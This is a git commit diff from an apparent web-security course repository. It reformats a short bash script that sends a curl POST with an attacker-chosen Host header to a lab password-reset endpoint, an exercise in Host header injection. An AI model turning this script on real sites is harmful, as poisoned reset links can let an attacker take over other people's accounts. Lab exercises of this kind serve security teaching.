7c4d8186b116ffca5e2c251b35384cbeeb86b0b1
wowkamran <KOmrOn.Ag@gmail.com>
2026-01-14 07:16:33 -0500

    3

--- web_application_security/0x00_web_fundamentals/1-host_header_injection.sh
+++ web_application_security/0x00_web_fundamentals/1-host_header_injection.sh
@@ -1,8 +1,2 @@
 #!/bin/bash
-# Usage:
-# ./1-hostheaderinjection.sh newhost http://web0x00.hbtn/reset_password "email=test@test.hbtn"
-
-curl -s -X POST "$2" \
-  -H "Host: $1" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  -d "$3"
+curl -s -X POST "$2" -H "Host: $1" -H "Content-Type: application/x-www-form-urlencoded" -d "$3"
